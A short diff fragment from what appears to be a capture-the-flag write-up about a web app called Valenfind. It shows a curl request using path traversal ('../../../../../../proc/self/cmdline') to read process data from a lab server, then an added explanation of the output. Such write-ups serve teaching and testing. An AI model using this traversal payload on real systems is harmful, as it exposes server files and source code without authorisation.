@@ -512,6 +512,8 @@ Result:
 └─$ curl "http://10.49.188.115:5000/api/fetch_layout?layout=../../../../../../proc/self/cmdline" --output -       
 /usr/bin/python3/opt/Valenfind/app.py   
 ```
+
+The two null-separated pieces are `/usr/bin/python3` (the Python interpreter) and `/opt/Valenfind/app.py` (the script it runs). `/opt` is the standard Linux location for optionally-installed, self-contained applications — a sensible home for a custom app. The main source file is therefore:
 <div align="center">
 <br>
 <br>
